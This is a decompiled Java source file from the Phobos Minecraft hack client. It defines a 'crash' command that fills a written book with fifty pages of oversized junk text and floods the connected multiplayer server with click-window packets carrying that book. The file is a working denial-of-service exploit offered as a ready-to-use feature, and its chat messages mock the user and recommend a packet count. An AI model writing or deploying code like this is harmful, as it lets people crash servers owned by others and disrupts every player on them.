/*    */ package me.earth.phobos.features.command.commands;
/*    */ 
/*    */ import me.earth.phobos.features.command.Command;
/*    */ import me.earth.phobos.util.Util;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.inventory.ClickType;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagCompound;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.nbt.NBTTagString;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketClickWindow;
/*    */ 
/*    */ public class CrashCommand extends Command {
/*    */   int packets;
/*    */   
/*    */   public CrashCommand() {
/* 20 */     super("crash", new String[] { "crash" });
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public void execute(final String[] commands) {
/* 26 */     (new Thread("crash time trololol")
/*    */       {
/*    */         public void run() {
/* 29 */           if (Minecraft.func_71410_x()
/*    */             
/* 31 */             .func_147104_D() == null || 
/*    */             
/* 33 */             (Minecraft.func_71410_x().func_147104_D()).field_78845_b.isEmpty()) {
/* 34 */             Command.sendMessage("Join a server monkey");
/*    */             
/*    */             return;
/*    */           } 
/* 38 */           if (commands[0] == null) {
/* 39 */             Command.sendMessage("Put the number of packets to send as an argument to this command. (20 should be good)");
/*    */             
/*    */             return;
/*    */           } 
/*    */           
/*    */           try {
/* 45 */             CrashCommand.this.packets = Integer.parseInt(commands[0]);
/* 46 */           } catch (NumberFormatException e) {
/*    */             
/* 48 */             Command.sendMessage("Are you sure you put a number?");
/*    */             
/*    */             return;
/*    */           } 
/*    */           
/* 53 */           ItemStack bookObj = new ItemStack(Items.field_151099_bA);
/* 54 */           NBTTagList list = new NBTTagList();
/* 55 */           NBTTagCompound tag = new NBTTagCompound();
/*    */           
/* 57 */           int pages = Math.min(50, 100);
/* 58 */           String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
/*    */           
/* 60 */           int i = 0;
/* 61 */           for (; i < pages; i++) {
/* 62 */             String siteContent = size;
/* 63 */             NBTTagString tString = new NBTTagString(siteContent);
/* 64 */             list.func_74742_a((NBTBase)tString);
/*    */           } 
/* 66 */           tag.func_74778_a("author", Util.mc.field_71439_g.func_70005_c_());
/* 67 */           tag.func_74778_a("title", "phobos > all :^D");
/* 68 */           tag.func_74782_a("pages", (NBTBase)list);
/* 69 */           bookObj.func_77983_a("pages", (NBTBase)list);
/* 70 */           bookObj.func_77982_d(tag);
/*    */ 
/*    */           
/* 73 */           i = 0;
/* 74 */           for (; i < CrashCommand.this.packets; i++) {
/* 75 */             Util.mc.field_71442_b.field_78774_b.func_147297_a((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
/*    */           }
/*    */         }
/* 78 */       }).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\miss_\Desktop\Phobos-1.3.3-release.jar!\me\earth\phobos\features\command\commands\CrashCommand.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */